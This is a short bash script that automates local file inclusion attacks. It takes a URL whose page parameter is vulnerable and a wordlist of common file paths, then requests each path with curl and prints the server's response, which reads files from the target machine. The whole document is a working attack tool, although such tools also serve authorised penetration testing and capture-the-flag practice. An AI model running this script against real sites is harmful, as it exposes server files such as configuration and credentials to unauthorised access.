#!/bin/bash

function usage {
  echo -e '\nScript to get output of LFI from multiple directories. \n\nUSAGE:'
  echo -e '\t-u:\tURL \n\t\tURL to site with local file inclusion. Needs the whole url i.e http://ip/file.php?page='
  echo -e '\t-w:\tWORDLIST \n\t\tWORDLIST of common places to search for'
  exit 0
}

argparse=u:w:h

while getopts ${argparse} options

do
  case "${options}" in

  u) URL=${OPTARG};;

  w) WORDLIST=${OPTARG};;

  h) usage
    
    esac
done

while IFS="" read -r p || [ -n "$p" ]
do
  printf '%s\n' "$URL$p"
  curl "$URL""$p"
done < $WORDLIST
